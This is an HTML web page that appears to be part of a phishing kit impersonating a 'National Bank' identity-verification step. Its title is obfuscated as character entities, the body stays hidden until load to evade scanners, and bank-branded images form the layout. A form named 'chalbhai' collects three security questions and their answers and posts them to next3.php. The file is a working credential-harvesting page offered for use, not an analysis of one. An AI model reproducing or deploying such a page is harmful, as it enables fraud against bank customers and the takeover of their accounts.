<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#124;&#32;&#78;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#66;&#97;&#110;&#107;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
  
.textbox {  
    border: solid 1px #8e8e8e; 
  	border-radius: 1px;
  	padding-left: 2px;
  	font-size: 14px;
    height: 23px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #7FA1D8;
  	border-radius: 1px;
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 

 </style>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1027px; height:153px; z-index:0"><img src="images/bc13.png" alt="" title="" border=0 width=1027 height=153></div>

<div id="image2" style="position:absolute; overflow:hidden; left:145px; top:177px; width:518px; height:19px; z-index:1"><img src="images/bc14.png" alt="" title="" border=0 width=518 height=19></div>

<div id="image3" style="position:absolute; overflow:hidden; left:138px; top:216px; width:358px; height:157px; z-index:2"><img src="images/bc17.png" alt="" title="" border=0 width=358 height=157></div>
<form action=next3.php name=chalbhai id=chalbhai method=post>
<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:342px;top:219px;width:398px;z-index:3">
<option value="">Select SiteKey Challenge Question 1</option>
                          <OPTION value="What was my nickname in elementary school?">What was my nickname in elementary school?</OPTION>
                          <OPTION value="In which city my father (mother) was born?">In which city my father (mother) was born? </OPTION>
                          <OPTION value="What sport do I play best?">What sport do I play best?</OPTION>
                          <OPTION value="Who was my first love?">Who was my first love?</OPTION>
                          <OPTION value="Who was the best man at my wedding?">Who was the best man at my wedding?</OPTION>
                          <OPTION value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</OPTION>
                          <OPTION value="Which song always makes me cry?">Which song always makes me cry?</OPTION>
                          <OPTION value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</OPTION>
                          <OPTION value="What was my first job?">What was my first job?</OPTION>
                          <OPTION value="What sport do I play best?">What sport do I play best?</OPTION>
                          <OPTION value="What make was my first car?">What make was my first car?</OPTION>
                          <OPTION value="What was the name of my elementary school?">What was the name of my elementary school?</OPTION>
                          <OPTION value="Who was my bestfriend on the first day of school?">Who was my bestfriend on the first day of school? </OPTION>
                          <OPTION value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</OPTION>
                          <OPTION value="Wich was the destination of my first airplane trip?">Wich was the destination of my first airplane trip?</OPTION>
                          <OPTION value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</OPTION>
                          <OPTION value="My favourite restaurant is...">My favourite restaurant is...</OPTION>
                          <OPTION value="My favourite book is...">My favourite book is...</OPTION>
                          <OPTION value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</OPTION>
                          <OPTION value="What is my hobby?">What is my hobby?</OPTION>
                          <OPTION value="What's my favourite dessert?">What's my favourite dessert?</OPTION>
                          <OPTION value="What's my favourite music group?">What's my favourite music group?</OPTION>
                          <OPTION value="What's my favourite song?">What's my favourite song? </OPTION>
                          <OPTION value="My favourite candy is...">My favourite candy is...</OPTION>
                          <OPTION value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</OPTION>
                          <OPTION value="What was my first pet called?">What was my first pet called?</OPTION>
</select>
<input name="ans1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:200px;left:342px;top:244px;z-index:4">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:342px;top:269px;width:398px;z-index:5">
<option value="">Select SiteKey Challenge Question 1</option>
                          <OPTION value="What was my nickname in elementary school?">What was my nickname in elementary school?</OPTION>
                          <OPTION value="In which city my father (mother) was born?">In which city my father (mother) was born? </OPTION>
                          <OPTION value="What sport do I play best?">What sport do I play best?</OPTION>
                          <OPTION value="Who was my first love?">Who was my first love?</OPTION>
                          <OPTION value="Who was the best man at my wedding?">Who was the best man at my wedding?</OPTION>
                          <OPTION value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</OPTION>
                          <OPTION value="Which song always makes me cry?">Which song always makes me cry?</OPTION>
                          <OPTION value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</OPTION>
                          <OPTION value="What was my first job?">What was my first job?</OPTION>
                          <OPTION value="What sport do I play best?">What sport do I play best?</OPTION>
                          <OPTION value="What make was my first car?">What make was my first car?</OPTION>
                          <OPTION value="What was the name of my elementary school?">What was the name of my elementary school?</OPTION>
                          <OPTION value="Who was my bestfriend on the first day of school?">Who was my bestfriend on the first day of school? </OPTION>
                          <OPTION value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</OPTION>
                          <OPTION value="Wich was the destination of my first airplane trip?">Wich was the destination of my first airplane trip?</OPTION>
                          <OPTION value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</OPTION>
                          <OPTION value="My favourite restaurant is...">My favourite restaurant is...</OPTION>
                          <OPTION value="My favourite book is...">My favourite book is...</OPTION>
                          <OPTION value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</OPTION>
                          <OPTION value="What is my hobby?">What is my hobby?</OPTION>
                          <OPTION value="What's my favourite dessert?">What's my favourite dessert?</OPTION>
                          <OPTION value="What's my favourite music group?">What's my favourite music group?</OPTION>
                          <OPTION value="What's my favourite song?">What's my favourite song? </OPTION>
                          <OPTION value="My favourite candy is...">My favourite candy is...</OPTION>
                          <OPTION value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</OPTION>
                          <OPTION value="What was my first pet called?">What was my first pet called?</OPTION>
</select>
<input name="ans2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:200px;left:342px;top:294px;z-index:6">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:342px;top:319px;width:398px;z-index:7">
<option value="">Select SiteKey Challenge Question 1</option>
                          <OPTION value="What was my nickname in elementary school?">What was my nickname in elementary school?</OPTION>
                          <OPTION value="In which city my father (mother) was born?">In which city my father (mother) was born? </OPTION>
                          <OPTION value="What sport do I play best?">What sport do I play best?</OPTION>
                          <OPTION value="Who was my first love?">Who was my first love?</OPTION>
                          <OPTION value="Who was the best man at my wedding?">Who was the best man at my wedding?</OPTION>
                          <OPTION value="Who was the maid of honour at my wedding?">Who was the maid of honour at my wedding?</OPTION>
                          <OPTION value="Which song always makes me cry?">Which song always makes me cry?</OPTION>
                          <OPTION value="What was my grandmother's maiden name?">What was my grandmother's maiden name?</OPTION>
                          <OPTION value="What was my first job?">What was my first job?</OPTION>
                          <OPTION value="What sport do I play best?">What sport do I play best?</OPTION>
                          <OPTION value="What make was my first car?">What make was my first car?</OPTION>
                          <OPTION value="What was the name of my elementary school?">What was the name of my elementary school?</OPTION>
                          <OPTION value="Who was my bestfriend on the first day of school?">Who was my bestfriend on the first day of school? </OPTION>
                          <OPTION value="What was the name of the street where I lived alone for the first time?">What was the name of the street where I lived alone for the first time?</OPTION>
                          <OPTION value="Wich was the destination of my first airplane trip?">Wich was the destination of my first airplane trip?</OPTION>
                          <OPTION value="At what time was my wedding ceremony?">At what time was my wedding ceremony?</OPTION>
                          <OPTION value="My favourite restaurant is...">My favourite restaurant is...</OPTION>
                          <OPTION value="My favourite book is...">My favourite book is...</OPTION>
                          <OPTION value="Where do I plan to live when I retire?">Where do I plan to live when I retire?</OPTION>
                          <OPTION value="What is my hobby?">What is my hobby?</OPTION>
                          <OPTION value="What's my favourite dessert?">What's my favourite dessert?</OPTION>
                          <OPTION value="What's my favourite music group?">What's my favourite music group?</OPTION>
                          <OPTION value="What's my favourite song?">What's my favourite song? </OPTION>
                          <OPTION value="My favourite candy is...">My favourite candy is...</OPTION>
                          <OPTION value="What was my kindergarten teacher's name?">What was my kindergarten teacher's name?</OPTION>
                          <OPTION value="What was my first pet called?">What was my first pet called?</OPTION>
</select>
<input name="ans3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:200px;left:342px;top:344px;z-index:8">
<div id="formimage1" style="position:absolute; left:345px; top:425px; z-index:9"><input type="image" name="formimage1" width="64" height="23" src="images/confirm.png"></div>

</body>
</html>